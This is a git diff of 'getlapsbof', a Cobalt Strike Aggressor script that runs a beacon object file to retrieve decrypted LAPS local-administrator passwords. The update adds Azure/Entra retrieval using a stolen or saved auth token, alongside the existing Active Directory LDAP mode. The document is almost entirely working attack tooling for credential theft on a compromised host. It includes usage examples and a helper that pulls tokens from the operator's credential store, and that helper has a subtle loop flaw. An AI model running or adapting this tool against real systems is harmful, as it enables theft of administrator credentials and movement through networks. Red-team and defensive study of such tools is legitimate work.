@@ -1,10 +1,10 @@
 # getlapsbof
-# version: 1.3.1
+# version: 1.4.0
 # Author: @SavSanta 
 # Original Credit: @xpn
-# Decrypt LAPSv2 Credentials
+# Retrieve decrypted On-Prem LAPSv2 and Azure/Entra LAPS Credentials
 
-beacon_command_register("getlapsbof", "getlapsbof version 1.3.1 - Decrypts LAPSv2 Credentials", "getlapsbof \c4<TARGET_DC>\o \c2<BASE_DN>\o \c7<TARGET_COMPUTER_DN>\o
+beacon_command_register("getlapsbof", "getlapsbof version 1.4.0 - Retrieve decrypted On-Prem LAPSv2 and Azure/Entra LAPS Credentials", "getlapsbof \cDADLAPS\o \c4<TARGET_DC>\o \c2<BASE_DN>\o \c7<TARGET_COMPUTER_DN>\o\ngetlapsbof \cDAZLAPS\o \c4<AUTH_TOKEN>\o \c7<TARGET_DEVICE_ID>\o
 
 Retrieve and Decrypt the the LAPSv2 password from the Windows Active Directory Domain Controller.
 
@@ -13,19 +13,24 @@ LDAP Connectivity
 Account with adequate privileges to read the password.
 
 Caveat:
-LAPSv1 (aka Legacy LAPS) not supported.
+LAPSv1 (aka Legacy LAPS) NOT supported.
 
-Exampled:
-getlapsbof \c4192.168.230.150\o \c2DC=sandstone,DC=camp\o \c7CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
-getlapsbof \c4sandstone.camp\o \c2DC=sandstone,DC=camp\o \c7CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
-getlapsbof \c4DC01.LAB.LOCAL\o \c2DC=LAB,DC=LOCAL\o \c7CN=COMPUTERACC,OU=LAPSENABLED,DC=LAB,DC=LOCAL\o
+\U Microsoft Active Directory\o
+getlapsbof \cDADLAPS\o \c4192.168.230.150\o \c2DC=sandstone,DC=camp\o \c7CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
+getlapsbof \cDADLAPS\o \c4sandstone.camp\o \c2DC=sandstone,DC=camp\o \c7CN=edworkbox1,OU=LAPSManaged,DC=sandstone,DC=camp\o
+getlapsbof \cDADLAPS\o \c4DC01.LAB.LOCAL\o \c2DC=LAB,DC=LOCAL\o \c7CN=COMPUTERACC,OU=LAPSENABLED,DC=LAB,DC=LOCAL\o
+
+\U Microsoft Azure/Entra AD \o
+getlapsbof \cDAZLAPS\o \c4eyBmke6y73223r.5g54dscv.JKO.340<snipped>\o \c727a4b0435-b1a1-4788-9f04-7215c5ec8ee1\o
+getlapsbof \cDAZLAPS\o \c4My_Secret_PazzWorD_fOr_tHe_AzUR3\o \c7F540115-21d1-f777-1cc3-1265c4556c5dd2\o
 ")
 
 
 alias getlapsbof {
     local('$barch $handle $data $args');
+    global('$args');
 
-    if(size(@_) < 2)
+    if(size(@_) < 3)
     {
         berror($1, beacon_command_detail("getlapsbof"));
         return;
@@ -37,14 +42,62 @@ alias getlapsbof {
     $data   = readb($handle, -1);
     closef($handle);
     
-    $server = $2;
-    $dn = $3;
-    $dnobject = $4;
-    $args = bof_pack($1, "zzz", $server, $dn, $dnobject);
+    $lapsmode = uc($2);
     
-    btask($1, "Target DC: $server");
-    btask($1, "Target Base DN: $dn");
-    btask($1, "Target Computer DN: $dnobject");
+    if ($lapsmode eq 'AZLAPS') {
+    
+        $at = $3;
+        $dev = $4;
+        
+        if (!$at) {
+            $at = get_saved_azcred($1);
+        }
+        
+        $atsnip = " " . left($at, 18);
+        $args = bof_pack($1, "zzzz", $lapsmode, $at, $dev, $atsnip);        
+        
+        blog2($1, "\cDAZ LAPS\o Mode");
+        blog2($1, "AuthToken: $+ $atsnip $+ <snipped>");
+        blog2($1, "Device: $dev");
+        
+    } else if ($lapsmode eq 'ADLAPS') {
+
+        $server = $3;
+        $dn = $4;
+        $dnobject = $5;
+        $args = bof_pack($1, "zzzz", $lapsmode, $server, $dn, $dnobject);
+    
+        blog2($1, "\cDAD LAPS\o Mode");
+        blog2($1, "Target DC: $server");
+        blog2($1, "Target Base DN: $dn");
+        blog2($1, "Target Computer DN: $dnobject");
+    } else {
+    
+        berror($1, "getlapsbof - UNKNOWN LAPS MODE");
+        return;     
+    
+    }
     
     beacon_inline_execute($1, $data, "go", $args);
+
+}
+
+
+# Search Cobalt Strike Credential Manager for operator saved Azure auth and return it.
+sub get_saved_azcred { 
+    local('$credmgr $secret');
+
+    foreach $cred (credentials()) {
+    
+        if ($cred["user"] eq "_getlapsbof_aztoken") {
+        
+            blog2($1, "Using saved Azure authentication token");
+            $secret = $cred["password"];
+            return $secret;
+        }
+    
+        berror($1, "No Azure authentication token provided.");
+        exit();
+    }
+
 }
